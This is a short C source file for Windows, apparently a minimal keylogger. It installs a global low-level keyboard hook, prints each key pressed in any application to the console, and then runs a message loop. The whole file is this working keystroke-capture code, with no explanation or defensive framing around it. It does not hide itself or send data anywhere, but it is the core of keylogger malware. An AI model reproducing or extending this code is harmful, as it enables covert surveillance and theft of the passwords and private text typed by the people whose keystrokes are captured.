#include <windows.h>
#include <stdio.h>
#include "cJSON.h"

//Keys Log
LRESULT hook_proc(int code, WPARAM wParam, LPARAM lParam) {
    KBDLLHOOKSTRUCT *keypointer = (KBDLLHOOKSTRUCT *) lParam;
    if (wParam == WM_KEYDOWN) {
        switch (keypointer->vkCode) {
            case VK_LSHIFT:
                printf("SHIFT ");
                break;
            case VK_SPACE:
                printf("SPACE ");
                break;
            case VK_BACK:
                printf("BACKSPACE ");
                break;
            case VK_RETURN:
                printf("ENTER ");
                break;
            default:
                printf("%c ", keypointer->vkCode);
                break;
        }
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}

int main() {
    HHOOK keyboardhook = SetWindowsHookExA(WH_KEYBOARD_LL, hook_proc, NULL, 0);
    if (keyboardhook == NULL) {
        printf("keylog failed\n");
    } else {
        printf("keylog started\n");
    }

    MSG msg;
    while( (GetMessage( &msg, NULL, 0, 0 )) != 0)
    { 
        TranslateMessage(&msg); 
        DispatchMessage(&msg); 
    } 
}